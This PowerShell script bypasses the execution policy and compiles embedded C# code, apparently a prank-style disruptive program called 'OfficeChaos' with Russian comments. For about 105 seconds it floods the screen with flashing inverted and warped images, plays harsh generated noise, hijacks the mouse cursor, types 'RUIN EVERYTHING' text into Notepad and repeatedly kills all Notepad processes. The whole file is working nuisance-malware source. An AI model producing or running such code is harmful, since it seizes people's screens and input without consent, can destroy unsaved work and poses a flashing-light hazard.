Set-ExecutionPolicy Bypass -Scope Process -Force

$randId = Get-Random -Minimum 10000 -Maximum 99999
$namespaceName = "OfficeChaos_$randId"

$code = @"
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;

namespace $namespaceName {
    public class PayloadRunner {
        [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hwnd);
        [DllImport("user32.dll")] public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);
        [DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32.dll")] public static extern bool StretchBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int nWidthSrc, int nHeightSrc, uint dwRop);
        [DllImport("user32.dll")] public static extern int GetSystemMetrics(int nIndex);
        [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
        [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y);
        [DllImport("user32.dll")] public static extern IntPtr LoadIcon(IntPtr hInstance, int lpIconName);
        [DllImport("user32.dll")] public static extern bool DrawIcon(IntPtr hdc, int x, int y, IntPtr hIcon);
        [DllImport("user32.dll")] public static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);
        [DllImport("gdi32.dll")] public static extern IntPtr CreateSolidBrush(uint crColor);
        [DllImport("gdi32.dll")] public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
        [DllImport("gdi32.dll")] public static extern bool DeleteObject(IntPtr hObject);
        [DllImport("gdi32.dll")] public static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, uint dwRop);

        [StructLayout(LayoutKind.Sequential)]
        public struct WAVEFORMATEX {
            public ushort wFormatTag; public ushort nChannels; public uint nSamplesPerSec;
            public uint nAvgBytesPerSec; public ushort nBlockAlign; public ushort wBitsPerSample; public ushort cbSize;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct WAVEHDR {
            public IntPtr lpData; public uint dwBufferLength; public uint dwBytesRecorded;
            public IntPtr dwUser; public uint dwFlags; public uint dwLoops; public IntPtr lpNext; public IntPtr reserved;
        }

        [DllImport("winmm.dll")] public static extern int waveOutOpen(out IntPtr hWaveOut, uint uDeviceID, ref WAVEFORMATEX lpFormat, IntPtr dwCallback, IntPtr dwInstance, uint fdwOpen);
        [DllImport("winmm.dll")] public static extern int waveOutPrepareHeader(IntPtr hWaveOut, ref WAVEHDR lpWaveOutHdr, uint uSize);
        [DllImport("winmm.dll")] public static extern int waveOutWrite(IntPtr hWaveOut, ref WAVEHDR lpWaveOutHdr, uint uSize);

        const uint SRCINVERT = 0x00660046;
        const uint SRCCOPY   = 0x00CC0220;
        const uint SRCPAINT  = 0x00EE0086;
        const uint PATINVERT = 0x005A0049;
        const uint DSTINVERT = 0x00550009;
        const uint NOTSRCOPY = 0x00330008;
        const uint SRCAND    = 0x008800C6;

        public static int currentPayload = 1;
        public static bool isRunning = true;

        public static void AudioThread() {
            IntPtr hWaveOut;
            WAVEFORMATEX wfx = new WAVEFORMATEX();
            wfx.wFormatTag = 1; wfx.nChannels = 1; wfx.nSamplesPerSec = 8000;
            wfx.nAvgBytesPerSec = 8000; wfx.nBlockAlign = 1; wfx.wBitsPerSample = 8; wfx.cbSize = 0;

            if (waveOutOpen(out hWaveOut, 0xFFFFFFFF, ref wfx, IntPtr.Zero, IntPtr.Zero, 0) != 0) return;

            int bufferSize = 8000;
            byte[] buffer = new byte[bufferSize];
            GCHandle handle = GCHandle.Alloc(buffer, GCHandleType.Pinned);

            WAVEHDR header = new WAVEHDR();
            header.lpData = handle.AddrOfPinnedObject();
            header.dwBufferLength = (uint)bufferSize;

            int t = 0;
            while (isRunning) {
                for (int i = 0; i < bufferSize; i++) {
                    byte b = 0;
                    switch (currentPayload) {
                        case 1: b = (byte)((t * (t >> 8 | t >> 9) & 46) * t); break;
                        case 2: b = (byte)((t * 5 & t >> 7) | (t * 3 & t >> 10)); break;
                        case 3: b = (byte)((t >> 3) * (t >> 4) ^ (t >> 6)); break;
                        case 4: b = (byte)((t * ((t >> 9 | t >> 13) % 11)) ^ (t >> 2)); break;
                        case 5: b = (byte)((t * (t >> 5 | t >> 8)) ^ (t >> 16)); break;
                        case 6: b = (byte)(((t * (t >> 8)) ^ (t * (t >> 13))) & 255); break;
                        case 7: b = (byte)((t * 3 & t >> 3 | t * 5 & t >> 4 | t * 7 & t >> 5)); break;
                    }
                    buffer[i] = b;
                    t++;
                }
                waveOutPrepareHeader(hWaveOut, ref header, (uint)Marshal.SizeOf(header));
                waveOutWrite(hWaveOut, ref header, (uint)Marshal.SizeOf(header));
                Thread.Sleep(950);
            }
        }

        public static void Run() {
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(1);
            Random r = new Random();

            Thread aThread = new Thread(AudioThread);
            aThread.IsBackground = true;
            aThread.Start();

            DateTime start = DateTime.Now;
            int appTimer = 0;

            // Создаем логотип-куб в стиле значка Office
            Bitmap officeLogo = new Bitmap(120, 120);
            using (Graphics g = Graphics.FromImage(officeLogo)) {
                g.Clear(Color.FromArgb(216, 59, 1)); // Фирменный оранжевый фон Office
                // Белая геометрическая рамка логотипа
                using (Pen pWhite = new Pen(Color.White, 8)) {
                    g.DrawRectangle(pWhite, 25, 25, 70, 70);
                }
            }

            while (isRunning) {
                if ((GetAsyncKeyState(0x1B) & 0x8000) != 0) break;

                IntPtr hdc = GetDC(IntPtr.Zero);
                int elapsed = (int)(DateTime.Now - start).TotalSeconds;

                if (elapsed >= 105) {
                    isRunning = false;
                    break;
                }

                currentPayload = (elapsed / 15) + 1;

                // 1. Бешеное движение курсора
                SetCursorPos(r.Next(0, w), r.Next(0, h));

                // 2. Открытие приложений и ввод чуши
                appTimer++;
                if (appTimer % 180 == 0) {
                    try {
                        Process.Start("notepad.exe");
                        Thread.Sleep(300);
                        SendKeys.SendWait("OFFICE OFFICE OFFICE ERROR 404 KSDCBRCTYS PANKOZA RUIN EVERYTHING! " + r.Next(1000, 9999) + "{ENTER}");
                    } catch {}
                }
                if (appTimer % 320 == 0) {
                    try {
                        foreach (var proc in Process.GetProcessesByName("notepad")) { proc.Kill(); }
                    } catch {}
                }

                // 3. Рисуем логотип кубом по экрану (не 3D, плоское смещение по сетке)
                using (Graphics gScreen = Graphics.FromHdc(hdc)) {
                    int cubeX = (elapsed * 35) % (w - 120);
                    int cubeY = (int)(Math.Sin(elapsed * 5) * 200 + (h / 2));
                    gScreen.DrawImage(officeLogo, cubeX, cubeY);
                }

                switch (currentPayload) {
                    case 1:
                        BitBlt(hdc, r.Next(-20, 21), r.Next(-20, 21), w, h, hdc, 0, 0, SRCINVERT);
                        break;
                    case 2:
                        for (int i = 0; i < 15; i++) {
                            int bx = r.Next(0, w - 150);
                            int by = r.Next(0, h - 150);
                            BitBlt(hdc, bx + r.Next(-15, 16), by + r.Next(-15, 16), 150, 150, hdc, bx, by, SRCCOPY);
                        }
                        break;
                    case 3:
                        for (int y = 0; y < h; y += 25) {
                            int shift = (int)(Math.Sin(y * 0.05 + elapsed * 10) * 60);
                            BitBlt(hdc, shift, y, w, 25, hdc, 0, y, SRCPAINT);
                        }
                        break;
                    case 4:
                        PatBlt(hdc, 0, 0, w, h, PATINVERT);
                        StretchBlt(hdc, 20, 20, w - 40, h - 40, hdc, 0, 0, w, h, SRCCOPY);
                        break;
                    case 5:
                        for (int x = 0; x < w; x += 30) {
                            BitBlt(hdc, x, r.Next(-30, 31), 30, h, hdc, x, 0, NOTSRCOPY);
                        }
                        break;
                    case 6:
                        DrawIcon(hdc, r.Next(0, w), r.Next(0, h), LoadIcon(IntPtr.Zero, 32513));
                        DrawIcon(hdc, r.Next(0, w), r.Next(0, h), LoadIcon(IntPtr.Zero, 32515));
                        StretchBlt(hdc, -25, -25, w + 50, h + 50, hdc, 0, 0, w, h, SRCAND);
                        break;
                    case 7:
                        BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCOPY);
                        if (r.Next(0, 2) == 0) PatBlt(hdc, 0, 0, w, h, DSTINVERT);
                        break;
                }

                ReleaseDC(IntPtr.Zero, hdc);
                Thread.Sleep(15);
            }

            InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
        }
    }
}
"@

$compiled = Add-Type -TypeDefinition $code -Language CSharp -ReferencedAssemblies "System.Windows.Forms", "System.Drawing" -PassThru
$runner = $compiled | Where-Object { $_.Name -eq "PayloadRunner" }
$runner::Run()